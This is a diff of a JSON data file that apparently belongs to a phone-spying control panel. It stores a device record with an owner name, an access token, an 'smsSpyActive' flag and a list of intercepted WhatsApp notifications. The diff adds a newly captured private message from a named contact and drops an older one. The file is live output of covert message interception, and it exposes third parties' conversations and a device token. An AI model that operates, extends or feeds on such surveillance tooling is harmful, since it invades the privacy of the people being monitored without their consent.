@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776924673084,
+    "lastSeen": 1776924685185,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Nakan",
+        "content": "aku save kayanya di akun google",
+        "time": "23/04 14:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776924685618
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "23/04 09:54",
         "pkg": "com.whatsapp",
         "receivedAt": 1776909277898
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Meii",
-        "content": "ok",
-        "time": "23/04 09:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776909277888
       }
     ],
     "galleryPhotos": [],
